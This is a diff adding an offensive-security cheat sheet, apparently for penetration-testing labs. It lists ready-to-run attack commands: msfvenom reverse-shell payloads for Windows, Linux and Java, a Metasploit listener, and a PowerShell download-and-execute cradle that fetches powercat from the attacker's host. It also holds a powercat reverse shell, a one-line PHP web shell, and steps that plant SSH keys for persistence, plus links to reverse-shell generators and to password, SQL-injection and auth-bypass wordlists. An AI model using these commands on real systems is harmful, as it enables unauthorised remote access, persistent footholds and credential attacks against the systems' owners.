@@ -1,0 +1,29 @@
+^Shell notes:if payload fails, try encoding the payload
+msfvenom:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f msi -o <filename1> #Windows MSI; kali-machine
+msfvenom:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f exe -o <filename1> #Windows EXE1; kali-machine
+msfvenom:msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -b '\x00\x2f\x0a' -f exe -o <filename1> #Windows EXE2; kali-machine
+msfvenom:msfvenom -p linux/x86/shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f elf > shell.elf #Linux ELF; kali-machine
+msfvenom:msfvenom -p java/jsp_shell_reverse_tcp LHOST=<kali> LPORT=<kaliPort> -f war > shell.war #java war; kali-machine
+Generates a Python-formatted Windows Meterpreter reverse TCP payload, stored in a variable named shell, that connects back to the attacker at the specified IP and port:msfvenom -p windows/meterpreter/reverse_tcp LHOST=<kali> LPORT=<kaliPort> EXITFUNC=thread -f python -v shell #kali-machine
+Generates a Python-formatted Windows Meterpreter reverse TCP payload, stored in a variable named shell, that connects back to the attacker at the specified IP and port:msfconsole -q -x "use exploit/multi/handler" #set lport <kaliPort>, set payload windows/meterpreter/reverse_tcp, set exitfunc thread, set lhost tun0, run; kali-machine
+powercat(file transfer and reverse shell) #remember to attempt base64 or urlencode:IEX (New-Object System.Net.Webclient).DownloadString("http://<kali>:<kaliPort>/powercat.ps1") #kali-machine
+powercat(file transfer and reverse shell) #remember to attempt base64 or urlencode:powercat -c <kali> -p <kaliPort> -e powershell #kali-machine
+php webshell:<?php system($_REQUEST['cmd']); ?> #kali-machine
+php webshell:echo '<?php system($_REQUEST["cmd"]); ?>' > <filename1>.php #target-machine
+search payload list:msfvenom --list payloads | grep -i <keyword> #kali-machine
+ssh #1:cat ~/.ssh/id_rsa.pub #on kali-machine; kali-machine
+ssh #1:echo '<id_rsa.pub>' >> /<user>/.ssh/authorized_keys #on target-machine; target-machine
+ssh #1:ssh <user>@<target> -i ~/.ssh/id_rsa #kali-machine
+ssh #2:rm ~/.ssh/known_hosts #clear SSH host key cache to avoid mismatch; kali-machine
+ssh #2:ssh-keygen -t rsa -b 4096 -f id_rsa #generate SSH keypair; kali-machine
+ssh #2:cat ~/.ssh/id_rsa.pub > authorized_keys #prepare authorized_keys file; kali-machine
+ssh #2:scp authorized_keys <user>@<target>:/home/<user>/.ssh/authorized_keys #install SSH key for persistence; kali-machine
+ssh #2:ssh <user>@<target> -i id_rsa #login using SSH key; kali-machine
+^revshell.com:https://www.revshells.com/ #kali-machine
+encoded reverse powershell:https://gist.github.com/tothi/ab288fb523a4b32b51a53e542d40fe58#file-mkpsrevshell-py
+encoded reverse powershell:python encoded_revshell.py <kali> <kaliPort>
+Common Usernames Wordlist:https://gist.github.com/kivox/920c271ef8dec2b33c84e1f2cc2977fc #kali-machine
+Common Passwords Wordlist:/usr/share/wordlists/rockyou.txt #kali-machine
+FastTrack Wordlist:https://github.com/KMGbully/hacksaw/blob/master/wordlists/fasttrack.txt #kali-machine
+SQL Injection Wordlist:https://github.com/PenTestical/sqli/blob/main/hugeSQL.txt #kali-machine
+Auth Bypass Wordlist:https://github.com/payloadbox/sql-injection-payload-list/blob/master/Intruder/exploit/Auth_Bypass.txt #kali-machine
